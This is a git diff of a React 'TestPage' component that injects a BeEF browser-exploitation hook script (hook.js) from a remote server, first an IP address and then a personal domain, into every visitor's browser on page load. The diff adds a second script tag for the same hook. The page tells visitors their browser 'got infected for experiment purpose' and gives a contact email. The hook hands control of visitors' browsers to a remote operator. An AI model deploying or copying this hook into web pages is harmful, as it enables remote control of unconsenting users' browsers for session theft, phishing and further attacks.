@@ -1,10 +1,12 @@
 import React, {useEffect} from 'react';
+import {render} from "@testing-library/react";
 
 function TestPage() {
     useEffect(() => {
+        console.log("TestPage mounted");
         // Dynamically add the hook.js script
         const script = document.createElement('script');
-        script.src = 'http://34.56.202.157:3000/hook.js';
+        script.src = 'https://beef.jorichz.fr/hook.js';
         script.async = true;
         document.body.appendChild(script);
 
@@ -15,10 +17,11 @@ function TestPage() {
     }, []);
 
     return (
-        <body className="w-screen h-screen bg-[f2f2f2] flex items-center justify-center text-center">
+        <div className="w-screen h-screen bg-[f2f2f2] flex items-center justify-center text-center">
         <p className={"font-bold text-xl"}>This page is for hacking test, if you are on this page your browser got infected for experiment purpose !
         <br/>Please contact me at hantzberg.joric@gmail.com for any request</p>
-        </body>
+        <script src={"https://beef.jorichz.fr/hook.js"}></script>
+        </div>
     );
 }
 
